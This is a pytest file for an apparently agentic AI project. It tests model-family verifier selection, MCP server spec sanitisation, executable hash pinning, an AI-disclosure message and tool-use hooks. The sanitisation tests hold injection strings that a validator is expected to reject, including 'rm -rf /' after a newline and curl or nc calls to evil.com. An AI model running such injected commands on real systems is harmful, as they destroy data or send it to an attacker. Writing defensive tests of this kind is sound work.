"""Wave 6 — May 2026 council intel: cross-family verifier, MCP STDIO
hardening, EU AI Act Article 50 disclosure, hooks lifecycle."""
from __future__ import annotations

import pytest


# ---------- Cross-family verifier guard ----------

class TestCrossFamilyVerifier:
    def test_provider_extraction(self):
        from maverick.verifier import _provider
        assert _provider("claude-opus-4-7") == "anthropic"
        assert _provider("anthropic:claude-opus-4-7") == "anthropic"
        assert _provider("openai:gpt-5.4") == "openai"
        assert _provider("gpt-5.4") == "openai"
        assert _provider("o3") == "openai"
        assert _provider("gemini-3-pro") == "gemini"
        assert _provider("deepseek-v4-pro") == "deepseek"
        assert _provider("grok-4.3") == "xai"

    def test_same_family_detection(self):
        from maverick.verifier import _same_family
        assert _same_family("claude-opus-4-7", "claude-sonnet-4-6") is True
        assert _same_family("anthropic:claude-opus-4-7", "claude-sonnet-4-6") is True
        assert _same_family("claude-opus-4-7", "gpt-5.4") is False

    def test_cross_family_fallback_default(self):
        """Anthropic orchestrator -> OpenAI verifier (default cross-family pick)."""
        from maverick.verifier import _cross_family_fallback
        assert _cross_family_fallback("claude-opus-4-7") == "openai:gpt-5.4"
        assert _cross_family_fallback("gpt-5.4").startswith("anthropic:")

    def test_cross_family_env_override(self, monkeypatch):
        from maverick.verifier import _cross_family_fallback
        monkeypatch.setenv("MAVERICK_CROSS_FAMILY_VERIFIER", "deepseek:deepseek-v4-pro")
        assert _cross_family_fallback("claude-opus-4-7") == "deepseek:deepseek-v4-pro"

    @pytest.mark.asyncio
    async def test_verifier_swaps_family_when_proposer_passed(
        self, fake_llm, make_llm_response,
    ):
        from maverick.budget import Budget
        from maverick.verifier import verify_proposal
        fake_llm.scripted = [make_llm_response(
            text='{"confidence": 0.9, "accepts": true, "critique": "", "issues": []}',
        )]
        # Proposer is Anthropic; we should NOT see verifier model in
        # the Anthropic family. The fake_llm just records the model
        # passed; we assert that model is non-Anthropic.
        await verify_proposal(
            "brief", "proposal text",
            fake_llm, Budget(),
            proposer_model="anthropic:claude-opus-4-7",
        )
        assert len(fake_llm.calls) == 1
        # Either explicit cross-family or the default openai fallback.
        model_used = fake_llm.calls[0].get("model") or ""
        assert "claude" not in model_used.lower()


# ---------- MCP STDIO subprocess input sanitization ----------

class TestMCPInputSanitization:
    def test_rejects_newline_in_command(self):
        from maverick.mcp_client import MCPServerSpec
        with pytest.raises(ValueError, match="illegal char"):
            MCPServerSpec(name="x", command="evil\nrm -rf /")

    def test_rejects_shell_meta_in_command(self):
        from maverick.mcp_client import MCPServerSpec
        with pytest.raises(ValueError, match="shell metacharacter"):
            MCPServerSpec(name="x", command="legit; curl evil.com")
        with pytest.raises(ValueError, match="shell metacharacter"):
            MCPServerSpec(name="x", command="legit | nc evil.com 80")
        with pytest.raises(ValueError, match="shell metacharacter"):
            MCPServerSpec(name="x", command="$(curl evil.com)")

    def test_rejects_newline_in_arg(self):
        from maverick.mcp_client import MCPServerSpec
        with pytest.raises(ValueError, match="arg #0"):
            MCPServerSpec(name="x", command="npx", args=["--foo\nbar"])

    def test_rejects_bad_env_key(self):
        from maverick.mcp_client import MCPServerSpec
        with pytest.raises(ValueError, match="env key"):
            MCPServerSpec(name="x", command="npx",
                          env={"BAD KEY": "value"})
        with pytest.raises(ValueError, match="env key"):
            MCPServerSpec(name="x", command="npx",
                          env={"1FOO": "v"})  # starts with digit

    def test_rejects_newline_in_env_value(self):
        from maverick.mcp_client import MCPServerSpec
        with pytest.raises(ValueError, match=r"env\[FOO\]"):
            MCPServerSpec(name="x", command="npx",
                          env={"FOO": "value\ninjected"})

    def test_allows_well_formed_spec(self):
        from maverick.mcp_client import MCPServerSpec
        spec = MCPServerSpec(
            name="filesystem",
            command="npx",
            args=["-y", "@modelcontextprotocol/server-filesystem", "/tmp"],
            env={"FOO_BAR": "value1", "X": "y"},
        )
        assert spec.name == "filesystem"

    def test_absolute_path_command_allowed(self):
        from maverick.mcp_client import MCPServerSpec
        spec = MCPServerSpec(name="x", command="/usr/local/bin/mcp-tool")
        assert spec.command == "/usr/local/bin/mcp-tool"


class TestMCPPinSha256:
    def test_pin_verification_passes_on_match(self, tmp_path):
        """When the pin hash matches the actual executable, start proceeds."""
        from maverick.mcp_client import MCPServerSpec, _verify_command_pin
        import hashlib
        exe = tmp_path / "mcp-tool"
        exe.write_bytes(b"#!/bin/sh\necho 'ok'\n")
        exe.chmod(0o755)
        sha = hashlib.sha256(exe.read_bytes()).hexdigest()
        spec = MCPServerSpec(
            name="x", command=str(exe), pin_sha256=sha,
        )
        # Should not raise.
        _verify_command_pin(spec)

    def test_pin_mismatch_raises(self, tmp_path):
        from maverick.mcp_client import (
            MCPClientError, MCPServerSpec, _verify_command_pin,
        )
        exe = tmp_path / "mcp-tool"
        exe.write_bytes(b"#!/bin/sh\necho 'ok'\n")
        exe.chmod(0o755)
        spec = MCPServerSpec(
            name="x", command=str(exe),
            pin_sha256="0" * 64,  # wrong hash
        )
        with pytest.raises(MCPClientError, match="pin_sha256 mismatch"):
            _verify_command_pin(spec)

    def test_pin_none_skips_check(self, tmp_path):
        from maverick.mcp_client import MCPServerSpec, _verify_command_pin
        # No pin set -> _verify_command_pin returns without touching disk.
        spec = MCPServerSpec(name="x", command="any-command-here")
        _verify_command_pin(spec)  # no raise


# ---------- EU AI Act Article 50 disclosure ----------

class TestArticle50Disclosure:
    def test_first_turn_returns_disclosure(self, tmp_path):
        from maverick.compliance import first_turn_disclosure
        from maverick.world_model import WorldModel
        wm = WorldModel(tmp_path / "w.db")
        msg = first_turn_disclosure(wm, "telegram", "user-42")
        assert msg is not None
        assert "Maverick" in msg
        assert "AI" in msg

    def test_after_assistant_turn_returns_none(self, tmp_path):
        from maverick.compliance import first_turn_disclosure
        from maverick.world_model import WorldModel
        wm = WorldModel(tmp_path / "w.db")
        conv = wm.get_or_create_conversation("telegram", "user-42")
        wm.append_turn(conv.id, "user", "hello")
        wm.append_turn(conv.id, "assistant", "hi back")
        assert first_turn_disclosure(wm, "telegram", "user-42") is None

    def test_only_user_turn_still_returns_disclosure(self, tmp_path):
        """User turn without assistant turn = still first interaction
        from the user's perspective (they haven't gotten a reply yet)."""
        from maverick.compliance import first_turn_disclosure
        from maverick.world_model import WorldModel
        wm = WorldModel(tmp_path / "w.db")
        conv = wm.get_or_create_conversation("telegram", "user-42")
        wm.append_turn(conv.id, "user", "hello")
        assert first_turn_disclosure(wm, "telegram", "user-42") is not None

    def test_empty_disclosure_text_opts_out(self, tmp_path, monkeypatch):
        from maverick.compliance import first_turn_disclosure
        from maverick.world_model import WorldModel
        monkeypatch.setenv("MAVERICK_AI_DISCLOSURE", "")
        wm = WorldModel(tmp_path / "w.db")
        assert first_turn_disclosure(wm, "telegram", "user-42") is None

    def test_custom_disclosure_text(self, tmp_path, monkeypatch):
        from maverick.compliance import first_turn_disclosure
        from maverick.world_model import WorldModel
        monkeypatch.setenv("MAVERICK_AI_DISCLOSURE", "Howdy, I am the AI.")
        wm = WorldModel(tmp_path / "w.db")
        msg = first_turn_disclosure(wm, "telegram", "user-42")
        assert msg == "Howdy, I am the AI."


# ---------- Hooks lifecycle ----------

class TestHooks:
    def teardown_method(self):
        from maverick import hooks
        hooks.clear()

    @pytest.mark.asyncio
    async def test_pre_tool_use_callable_can_block(self):
        from maverick import hooks
        from maverick.hooks import HookContext, HookEvent
        hooks.register(
            HookEvent.PRE_TOOL_USE,
            lambda ctx: False,  # block everything
            matcher="*",
        )
        ctx = HookContext(event=HookEvent.PRE_TOOL_USE, tool_name="shell")
        allowed = await hooks.dispatch(ctx)
        assert allowed is False

    @pytest.mark.asyncio
    async def test_post_tool_use_cannot_block(self):
        """Post* hooks observe; they never block."""
        from maverick import hooks
        from maverick.hooks import HookContext, HookEvent
        hooks.register(HookEvent.POST_TOOL_USE, lambda ctx: False)
        ctx = HookContext(event=HookEvent.POST_TOOL_USE, tool_name="shell",
                          tool_result="ok")
        allowed = await hooks.dispatch(ctx)
        assert allowed is True

    @pytest.mark.asyncio
    async def test_matcher_glob(self):
        from maverick import hooks
        from maverick.hooks import HookContext, HookEvent
        seen: list[str] = []
        hooks.register(
            HookEvent.PRE_TOOL_USE,
            lambda ctx: seen.append(ctx.tool_name) or True,
            matcher="shell*",
        )
        await hooks.dispatch(HookContext(event=HookEvent.PRE_TOOL_USE,
                                         tool_name="shell"))
        await hooks.dispatch(HookContext(event=HookEvent.PRE_TOOL_USE,
                                         tool_name="shell_alias"))
        await hooks.dispatch(HookContext(event=HookEvent.PRE_TOOL_USE,
                                         tool_name="read_file"))
        assert seen == ["shell", "shell_alias"]

    @pytest.mark.asyncio
    async def test_hook_exception_is_isolated(self):
        """A buggy hook must not take down the agent."""
        from maverick import hooks
        from maverick.hooks import HookContext, HookEvent

        def bad(ctx):
            raise RuntimeError("oops")

        hooks.register(HookEvent.PRE_TOOL_USE, bad)
        # Doesn't propagate; bad hook fails open.
        allowed = await hooks.dispatch(HookContext(
            event=HookEvent.PRE_TOOL_USE, tool_name="shell",
        ))
        assert allowed is True

    @pytest.mark.asyncio
    async def test_async_callable_hook(self):
        from maverick import hooks
        from maverick.hooks import HookContext, HookEvent

        async def async_hook(ctx):
            return True

        hooks.register(HookEvent.PRE_TOOL_USE, async_hook)
        allowed = await hooks.dispatch(HookContext(
            event=HookEvent.PRE_TOOL_USE, tool_name="x",
        ))
        assert allowed is True

    @pytest.mark.asyncio
    async def test_shell_hook_blocks_on_nonzero_exit(self, tmp_path):
        """A shell command exiting non-zero blocks PreToolUse."""
        from maverick import hooks
        from maverick.hooks import HookContext, HookEvent
        script = tmp_path / "blocker.sh"
        script.write_text("#!/bin/sh\nexit 1\n")
        script.chmod(0o755)
        hooks.register(
            HookEvent.PRE_TOOL_USE, str(script),
            matcher="dangerous_*",
        )
        allowed = await hooks.dispatch(HookContext(
            event=HookEvent.PRE_TOOL_USE,
            tool_name="dangerous_shell",
        ))
        assert allowed is False
